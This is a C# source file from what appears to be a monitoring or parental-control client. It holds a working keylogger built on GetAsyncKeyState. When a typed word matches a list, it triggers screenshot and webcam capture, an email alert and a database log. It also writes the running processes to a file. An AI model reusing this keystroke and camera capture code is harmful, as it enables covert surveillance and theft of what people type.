using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;  
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientSide
{  
    class MonitorTyping
    {
        public bool monitorTypingIAlive;
        public DBclient dbs;
        public setSetting set;
        public Thread keyLogger;
        public string input = "";

        public MonitorTyping(DBclient dbs, setSetting set)
        {
            monitorTypingIAlive = true;
            this.dbs = dbs;
            this.set = set;
            keyLogger = new Thread(playKeyLogger);
            keyLogger.Start();
        }

        // keylogger from API
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public  void playThread()
        {
            Thread keyLogger = new Thread(playKeyLogger);
            keyLogger.Start();
        }

        public void playKeyLogger()
        {
            List<string> offensiveWords = set.getWord();
            input = "";
            bool flag = true;
            while (flag)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        input += (char)i; 

                        if (i == 32) // if type space 
                        {
                             
                            wordFromKeylogger handler = Program.updateCurrentKeylogger;
                            handler(input);

                            //ShowErrorDialog(input);
                            string replacement = input.Replace(" ", "");
                            //ShowErrorDialog(replacement);
                             foreach (string badWord in offensiveWords)
                             {

                                 string xb = badWord.Replace(" ", "");
                                 if (replacement.ToLower().Equals(badWord))
                                 {
                                     reportOrSendAlert(badWord);                                  
                                 }
                            }
                            input = "";
                        }

                       
                    }
                }
            }  

        }
     
        private void reportOrSendAlert(string badWord)
        {
            if (set.triggersForAlert.Contains("badWord") == true)
            {
                string FilePic = Picters.ScreenCapture();
                Picters.CaptureCamera(FilePic);
                Report.sendAlertToMail(FilePic, "badWord trigger occur");
                ShowErrorDialog("send alert to mail\nTypedin trigger occur\nword: " + badWord );

            }

            if (set.triggersForReport.Contains("badWord") == true)
            {
                dbs.connectToDatabase();
                dbs.fillTable(1, DateTime.Now.ToString(), "\"" + badWord + "\"");
                ShowErrorDialog("update DB\nTypedin trigger occur\nword: " + badWord);
            }
        }

        public  void inputEqualsSARA()
        {
           
            
            // sava keylogger in file
            String filepath = Environment.CurrentDirectory;
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
           
            string path = (filepath + @"\AllAPP.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path)) ;
            }
            string AllApp = ShowAllProcess.ListAllApplications();
            using (StreamWriter sw = File.AppendText(path))
            {
                sw.Write(AllApp);

            }
            ShowErrorDialog(AllApp);//SARA 





        }

        private static void ShowErrorDialog(string message)
        {
            MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}
//abbabb